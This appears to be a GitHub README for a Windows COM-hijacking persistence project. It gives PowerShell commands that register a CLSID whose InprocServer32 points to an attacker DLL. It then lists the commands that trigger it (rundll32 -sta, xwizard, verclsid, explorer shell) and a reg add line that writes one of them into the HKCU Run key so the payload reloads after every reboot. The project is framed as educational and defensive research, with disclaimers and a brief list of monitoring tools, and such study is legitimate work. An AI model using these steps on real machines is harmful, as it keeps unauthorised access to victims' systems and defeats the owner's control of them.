# 🔐 COM Proxy for Persistent Attack  

## 📖 Project Description  
This project demonstrates how a **COM Proxy** can be implemented on Windows to simulate **persistence techniques**.  
The main goal is to **understand and analyze** the role of COM objects in persistence, and to provide a reference for **educational and research purposes only**.  

> ⚠️ **Important:** This project is strictly for **educational and defensive security research**.  
> Any misuse against unauthorized systems is **illegal** and the author is not responsible for any consequences.  

---

## ✨ Features  
✅ Simulates a custom COM Proxy on Windows  
✅ Creates and registers CLSIDs and `InprocServer32` entries for persistence  
✅ Demonstrates multiple execution methods (rundll32, xwizard, etc.)  
✅ Can be monitored with tools like **Sysmon**, **Process Explorer**, and **Event Viewer**  
✅ Fully compatible with modern Windows versions  

---

## 🛠️ Prerequisites  
- Windows 10 or higher   
- **Administrator privileges** to register COM objects in the registry  

---

## 🚀 Installation & Setup  

1. Clone the repository:  
```bash
git clone https://github.com/arminhosseinzadeh/Persistence-COM-Proxy.git
```

2. Open the project  

3. Run the **`clsid.ps1`** script.  
   This script creates a new **CLSID** under:  
   ```
   HKCU:\Software\Classes\CLSID\{$CLSID}\
   ```

4. Inside this path, it creates a registry subkey **`InprocServer32`** and assigns it as follows:  
   ```powershell
   New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{$CLSID}\InProcServer32" -Name "(default)" -Value $Payload | Out-Null
   ```

   Here, **`$Payload`** contains the path to the attacker’s DLL file:  
   ```powershell
   $Payload = "c:\mem\test.dll"
   ```


5. Once the COM object has been created and properly configured, the CLSID can be executed using one of the following commands: 

```powershell
rundll32 -sta {CLSID}
xwizard runwizard "{CLSID}"
verclsid /S /C {CLSID}
explorer shell:::{CLSID}
```

6. To make sure the malicious DLL is executed persistently, one of the above commands is placed in the Windows Run key so that after each system reboot the CLSID (pointing to the attacker’s payload) is executed again. The Windows Run key is located at:

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

For this purpose, a new subkey named Armin (or any other name) is created as follows: 
```powershell
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /V Armin /t REG_SZ /d "rundll32 -sta {CLSID}"
```

As a result, Therefore, after every reboot (which would normally break the attacker’s access), the command "rundll32 -sta {CLSID}" is executed again, restoring the attacker’s access through the malicious COM object.

---

## 📊 Monitoring & Detection  

You can observe and analyze the behavior using:  
- **Sysmon** (Registry & Process events)  
- **Event Viewer**  
- **Process Explorer / Procmon**  
- **OLE/COM Object Viewer**  

---

## ⚠️ Disclaimer  

> **Warning ⚠️**  
> This project is created **for educational and research purposes only**.  
> It is intended to demonstrate how COM proxies can be used to achieve persistence on Windows systems, and to help security professionals better understand and detect such techniques.  
>   
> - Do **NOT** use this code on systems you do not own or do not have explicit permission to test.  
> - The author(s) of this project take **no responsibility** for any misuse or damage caused by the use of this code.  
> - By using this project, you agree to use it **solely for learning, testing, and defensive security research** in isolated and controlled environments (e.g., virtual machines).  

---

## 📚 Resources  
- [Microsoft COM Documentation](https://learn.microsoft.com/en-us/windows/win32/com/component-object-model--com--portal)  
- [Sysinternals Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer)  
- [Sysmon Reference](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)  

---

 
